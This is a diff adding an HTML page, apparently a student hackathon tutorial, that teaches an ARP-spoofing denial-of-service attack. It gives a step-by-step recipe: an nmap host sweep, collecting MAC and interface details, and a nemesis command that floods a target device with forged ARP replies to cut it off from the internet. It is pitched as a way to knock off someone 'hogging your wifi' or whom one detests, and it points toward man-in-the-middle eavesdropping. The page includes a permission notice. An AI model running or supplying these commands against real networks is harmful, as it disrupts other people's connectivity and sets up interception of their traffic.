@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Denying Wifi Access - By Diego Contreras | Someone hogging your wifi? Absolutely detest someone? Fear no more; Nemesis is here.</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Denying Wifi Access - By Diego Contreras" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Someone hogging your wifi? Absolutely detest someone? Fear no more; Nemesis is here." />
+<meta property="og:description" content="Someone hogging your wifi? Absolutely detest someone? Fear no more; Nemesis is here." />
+<link rel="canonical" href="http://localhost:4000/" />
+<meta property="og:url" content="http://localhost:4000/" />
+<meta property="og:site_name" content="Denying Wifi Access - By Diego Contreras" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Denying Wifi Access - By Diego Contreras" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","description":"Someone hogging your wifi? Absolutely detest someone? Fear no more; Nemesis is here.","headline":"Denying Wifi Access - By Diego Contreras","name":"Denying Wifi Access - By Diego Contreras","url":"http://localhost:4000/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Denying Wifi Access - By Diego Contreras</h1>
+        </a>
+        <h2>Someone hogging your wifi? Absolutely detest someone? Fear no more; Nemesis is here.</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p><strong>Submission for 2022 NLMUSD Hackathon</strong></p>
+
+<h1 id="introduction">Introduction</h1>
+<p>Hello! I am Diego Contreras from John Glenn High School. I have been programming since I was in middle school, completely self-taught, and have a great deal in experience working with computers. This year’s theme is to <strong>teach something we are passionate about</strong>. Personally, I am passionate about <strong>hacking</strong>. Because of how vast the field is, I’ll teach you one small attack: <code class="language-plaintext highlighter-rouge">ARP-Spoofed DoS</code>. This specific attack allows you to completely block a device on a network from accessing the internet for as long as you’d like.</p>
+
+<h2 id="notice">Notice</h2>
+<p><strong><em>The following should not be tried on a system you do not own or have permission to mess with. In addition, this hack will not work with all routers and devices; Both can possibly have protections against this, making it useless.</em></strong></p>
+
+<h2 id="requirements">Requirements</h2>
+<p>Before getting to the exciting stuff, you’ll need the following to perform the attack:</p>
+<ul>
+  <li>Have a Linux-based OS (Debian, Fedora, Arch, Ubuntu, Kali, ect.)</li>
+  <li>Have <em>consented</em> access to a home router (enterprise-level routers have protections against this)</li>
+  <li>Know the basics of packets and protocols.</li>
+  <li>Know the basics of the command line.</li>
+  <li>Have <code class="language-plaintext highlighter-rouge">nmap</code> installed via your package manager (<code class="language-plaintext highlighter-rouge">sudo apt install nmap</code> for Debian-based OS)</li>
+</ul>
+
+<h2 id="how-it-works">How it works</h2>
+<p>Teach how the attack works</p>
+
+<h2 id="performing-the-attack">Performing the attack</h2>
+<p>To perform this attack, we will be using <a href="https://github.com/libnet/nemesis">nemesis</a>. This tool is used for many things relating to packet creation and formation, but today we will use it to create and spoof ARP packets.</p>
+
+<h3 id="step-1">Step 1</h3>
+<p>Install <a href="https://github.com/libnet/nemesis">nemesis</a> by following the instructions in the <a href="https://github.com/libnet/nemesis/blob/master/README.md">README</a> or getting it from its <a href="https://github.com/libnet/nemesis/releases/tag/v1.8">releases</a>.</p>
+
+<p>After this, get the private IP addresses of every device on your network via <code class="language-plaintext highlighter-rouge">sudo nmap -sn 192.168.1.1/24</code>. The output will look something like the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@hackerman ~&gt; sudo nmap -sn 192.168.1.1/24
+Starting Nmap 7.80 ( https://nmap.org )
+Nmap scan report for 192.168.1.1
+Host is up (0.0054s latency).
+MAC Address: F4:69:42:EC:F6:A8 (Unknown)
+
+Nmap scan report for 192.168.1.51
+Host is up (0.22s latency).
+MAC Address: D2:D5:F5:52:B9:58 (Microsoft)
+
+Nmap scan report for 192.168.1.75
+Host is up (0.21s latency).
+MAC Address: 80:60:B7:16:90:9B (Samsung)
+
+Nmap scan report for 192.168.1.80
+Host is up (0.093s latency).
+MAC Address: 64:D2:C4:A5:37:9A (Unknown)
+
+Nmap scan report for 192.168.1.113
+Host is up (0.092s latency).
+MAC Address: B8:8A:EC:35:F2:7F (Nintendo)
+
+Nmap scan report for 192.168.1.158
+Host is up (0.094s latency).
+MAC Address: 64:D2:C4:AA:CE:18 (Unknown)
+
+Nmap scan report for 192.168.1.183
+Host is up (0.073s latency).
+MAC Address: D0:03:4B:CD:57:17 (Apple)
+
+Nmap scan report for 192.168.1.194
+Host is up (0.20s latency).
+MAC Address: AC:F6:F7:9F:08:E0 (LG Electronics (Mobile Communications))
+
+Nmap done: 256 IP addresses (7 hosts up) scanned in 9.78 seconds
+</code></pre></div></div>
+
+<p>This simply lists the MAC Addresses and IP Addresses of every device on the network, with <code class="language-plaintext highlighter-rouge">192.168.1.1</code> being the IP address of your router. Choose a device and write down its IP and MAC Address. For the sake of this tutorial, I’ll use the Nintendo Switch connected with an IP address of <code class="language-plaintext highlighter-rouge">192.168.1.113</code>. Write this down in addition to the IP of the router mentioned before.</p>
+
+<h3 id="step-2">Step 2</h3>
+<p>Run <code class="language-plaintext highlighter-rouge">ifconfig</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@hackerman ~&gt; ifconfig
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 78674  bytes 11694275 (11.6 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 78674  bytes 11694275 (11.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlp6s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.1.189  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 2600:6c50:727f:7680:7528:55d3:dfc:445a  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 fe80::52c6:9c5c:6ea0:b821  prefixlen 64  scopeid 0x20&lt;link&gt;
+        inet6 2600:6c50:727f:7680::18ad  prefixlen 128  scopeid 0x0&lt;global&gt;
+        inet6 2600:6c50:727f:7680:d2d4:a827:bf0f:f9eb  prefixlen 64  scopeid 0x0&lt;global&gt;
+        ether 60:14:B3:B9:DE:BD  txqueuelen 1000  (Ethernet)
+        RX packets 5729186  bytes 6927109944 (6.9 GB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3893098  bytes 2774117092 (2.7 GB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+
+<p>This command simply lists the network cards attached to your computer. Write down the MAC address of your computer; In this case it is <code class="language-plaintext highlighter-rouge">60:14:B3:B9:DE:BD</code> for the MAC Address. In addition, write down the name of the network card. In this case it is <code class="language-plaintext highlighter-rouge">wlp6s0</code>.</p>
+
+<p>By now, you should have the following:</p>
+
+<ul>
+  <li>Nintendo Switch
+    <ul>
+      <li>IP : <code class="language-plaintext highlighter-rouge">192.168.1.113</code></li>
+    </ul>
+  </li>
+  <li>My Computer
+    <ul>
+      <li>MAC: <code class="language-plaintext highlighter-rouge">60:14:B3:B9:DE:BD</code></li>
+      <li>Network Card: <code class="language-plaintext highlighter-rouge">wlp6s0</code></li>
+    </ul>
+  </li>
+  <li>Router
+    <ul>
+      <li>IP: <code class="language-plaintext highlighter-rouge">192.168.1.1</code></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="step-3">Step 3</h3>
+<p>Here we will run the actual <code class="language-plaintext highlighter-rouge">nemesis</code> command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@hackerman ~&gt; sudo nemesis arp -c 10000 -i 1 -v -r -d wlp6s0 -S 192.168.1.1 -D 192.168.1.113 -h $60:14:B3:B9:DE:BD
+ARP/RARP Packet Injection -=- The NEMESIS Project v1.8
+
+               [MAC] 60:14:B3:B9:DE:BD &gt; F4:69:42:EC:F6:A8
+     [Ethernet type] ARP (0x0806)
+
+  [Protocol addr:IP] 192.168.1.1 &gt; 192.168.1.113
+ [Hardware addr:MAC] 60:14:B3:B9:DE:BD &gt; F4:69:42:EC:F6:A8
+     [Ethernet type] ARP (0x0806)
+        [ARP opcode] Reply
+  [ARP hardware fmt] Ethernet (1)
+  [ARP proto format] IP (0x0800)
+  [ARP protocol len] 6
+  [ARP hardware len] 4
+
+Wrote 42 byte ARP packet through linktype DLT_EN10MB.
+</code></pre></div></div>
+
+<p>Essentially, this command crafts an ARP packet that fools the Nintendo Switch into thinking the attacking computer is the router. As the attacking computer won’t send that packet to the internet, the device no longer has access to the internet. Because the device re-asks the network “Hey, are you <em>sure</em> this is the router?” every few seconds, the command keeps sending packets every second to make sure the device has no internet.</p>
+
+<p>If we instead attacked another linux computer, we can run the <code class="language-plaintext highlighter-rouge">arp</code> command on the victim device <strong>before</strong> and <strong>after</strong> to show how the MAC address changed to that of the attacking computer, where <code class="language-plaintext highlighter-rouge">192.168.1.189</code> is the IP of the attacking computer:</p>
+
+<p><strong>BEFORE</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@hackerman ~&gt; arp 
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.1.1              ether   F4:69:42:EC:F6:A8   C                     wlp6s0
+192.168.1.189            ether   60:14:B3:B9:DE:BD   C                     wlp6s0
+</code></pre></div></div>
+
+<p><strong>AFTER</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@hackerman ~&gt; arp 
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.1.1              ether   60:14:B3:B9:DE:BD   C                     wlp6s0
+192.168.1.189            ether   60:14:B3:B9:DE:BD   C                     wlp6s0
+</code></pre></div></div>
+
+<p>As you can see, the MAC value of the router is the same as the attacking computer after this command, meaning that sending anything to the router is essentially the same as sending it to the attacker, who will do nothing with it thus resulting in no internet.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>By applying basic knowledge of networking and using a simple tool, it is possible to prevent someone to use to internet. While the applications of this specific attack is underwhelming, the reconnaissance and tools used have several other applications other than this in several other attacks. One such attack is part of a major technique in hacking: Man in the Middle Attacks (MITM). These types of attack use almost the same technique (ARP Poisoning) with a few modifications to listen into conversations between devices, giving you the full picture of what is going on between two devices. In conclusion, with the knowledge you have gained, I hope you are ready to take on bigger, better hacks that don’t end you up in jail.</p>
+
+      </section>
+    </div>
+  </body>
+</html>
